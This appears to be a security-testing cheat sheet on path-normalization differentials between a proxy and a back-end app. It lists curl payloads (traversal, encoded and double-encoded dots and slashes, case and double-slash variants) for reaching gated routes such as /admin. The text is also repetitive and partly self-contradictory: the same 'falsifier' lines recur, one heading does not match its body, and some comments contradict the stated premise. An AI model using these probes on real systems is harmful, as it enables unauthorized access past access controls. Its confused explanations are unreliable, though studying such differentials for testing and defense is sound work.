# Normalization — the path/encoding differentials, exhaustively

The normalization boundaries — a path the proxy and the app parse differently.

---

## 1. The model — a path the two parse differently

```text
a path the front-end (proxy) normalizes one way and the back-end
(app) another — the same bytes, two different interpretations — the
disagreement is the vulnerability — a route-confusion surface.
```

## 2. The traversal boundary — a /static/../admin

```bash
# a path the proxy and the app normalize differently
curl "$BASE/static/../admin"   # the proxy normalizes to /admin; the app routes to /admin
curl "$BASE/%2e%2e/admin"      # an encoded path
curl "$BASE/static/%2e%2e/admin"  # a mixed-encoding path
```

## 3. The encoded-path boundary — a %2e%2e

```bash
# an encoded path the proxy and the app decode differently
curl "$BASE/%61dmin"           # an encoded 'a' — a case/encoding boundary
curl "$BASE/%2fadmin"          # an encoded '/'
curl "$BASE/%252e%252e/admin"  # a doubly-encoded path
```

## 4. The case boundary — a /Page vs /page

```bash
# a path the proxy stores case-sensitively but the app routes case-insensitively
curl "$BASE/Page"              # the proxy stores under /Page; the app serves /
curl "$BASE/PAGE"              # a case difference
```

## 5. The double-slash boundary — a /page//admin

```bash
# a path the proxy and the app normalize differently
curl "$BASE/page//admin"       # a double-slash boundary
curl "$BASE/page./admin"       # a dot-slash boundary
curl "$BASE/%2f/admin"         # a leading-encoded-slash boundary
```

## 6. The normalization's use — a route confusion

```text
a path the proxy normalizes one way and the app routes another — the
proxy's check reads a different path than the app's — a route-confusion
surface — a gated route reached through the differential.
```

## 7. The normalization's check — the differential probe

```bash
# the normalization check — does the proxy and the app parse differently
curl "$BASE/static/../admin"   # the proxy normalizes to /admin; the app routes to /admin
#   a 200 on /admin → a normalization differential → a route confusion
```

## 8. The normalization's falsifier — the same parse

```text
the proxy and the app normalize the same way → no confusion → a
different class.
```

## 9. The normalization's scope — which routes are reachable

```text
a path the proxy's check gates → the app's route reached → a gated
route through the differential — an authenticated-only route, an
internal route, a restricted endpoint.
```

## 10. The normalization's edge — a keyed path

```text
a path the proxy and the app normalize the same way → no confusion →
a different class.
```

## 11. The per-boundary map — which boundary for which surface

```text
a traversal boundary      → /static/../admin
an encoded-path boundary  → /%2e%2e/admin, /%252e%252e/admin
a case boundary           → /Page vs /page
a double-slash boundary   → /page//admin
a dot-slash boundary      → /page./admin
```

## 12. The normalization's falsifier — a different class

```text
a path the proxy and the app normalize the same way → no confusion →
a different class. a stored copy → a cache-poisoning. a desync → a
request-smuggling.
```
